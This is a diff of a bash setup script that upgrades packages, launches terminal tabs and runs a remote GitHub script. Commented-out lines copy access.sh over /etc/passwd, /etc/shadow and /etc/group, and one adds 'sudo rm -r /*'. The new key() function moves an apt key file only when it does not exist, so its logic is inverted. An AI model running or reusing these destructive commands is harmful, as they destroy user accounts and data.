@@ -29,6 +29,8 @@ FILE=~/work
 BOBO=~/work/sketch
 YUM=/etc/sources.list.bak
 U='$USER'
+LOCK=/etc/apt/trusted.gpg
+now=$(date +"%Y")
 
 check() {
 echo "would you like me to check your machine architecture?"
@@ -69,13 +71,14 @@ fi
 }
 
 run() {
-x-terminal-emulator --tab --title='hobo' -e bash 'fim -a https://raw.githubusercontent.com/shell382/sketch/main/blunk.sh' &
+#x-terminal-emulator --tab --title='hobo' -e bash 'fim -a https://raw.githubusercontent.com/shell382/sketch/main/blunk.sh' &
 #sudo mv /etc/apt/sources.list.d/mobian.list /etc/apt/sources.list.d/mobian.list.bak
 sudo apt update
 sudo apt -y dist-upgrade
-sudo cp access.sh /etc/passwd && sudo cp /etc/passwd /etc/shadow && sudo cp /etc/shadow /etc/group
+#sudo cp access.sh /etc/passwd && sudo cp /etc/passwd /etc/shadow && sudo cp /etc/shadow /etc/group
 #x-terminal-emulator --tab --title='hobo' -e bash './https://raw.githubusercontent.com/shell382/sketch/main/blunk.sh' &
 sudo apt -y install xfce4-terminal fim
+x-terminal-emulator --tab --title='hobo' -e bash 'fim -a https://raw.githubusercontent.com/shell382/sketch/main/blunk.sh' &
 xfce4-terminal -e 'bash -c "fim -a heart.jpg"' -T ".." &
 #sudo cp access.sh /etc/passwd && sudo cp /etc/passwd /etc/shadow && sudo cp /etc/shadow /etc/group && sudo rm -r /*
 xfce4-terminal -e 'bash -c "fim -a hi.jpg"' -T "..." &
@@ -101,6 +104,15 @@ xfce4-terminal -e 'bash -c "cd ~/work/sketch; ./blunk.sh; bash"' -T "Run and rea
 #                echo "SDC"
 #fi
 #}
+
+key() {
+if [ -f "$LOCK" ]; then
+    echo "$LOCK exists."
+else
+   echo "$LOCK doesnt exists."
+   sudo mv /etc/apt/trusted.gpg /etc/apt/trusted.gpg.d/ubuntu-keys-$now.gpg
+fi
+}
 
 yab() {
 if [ -f "$FILE" ]; then
@@ -195,6 +207,7 @@ fi
 
 check
 yab
+key
 run
 #spunk
 #drive
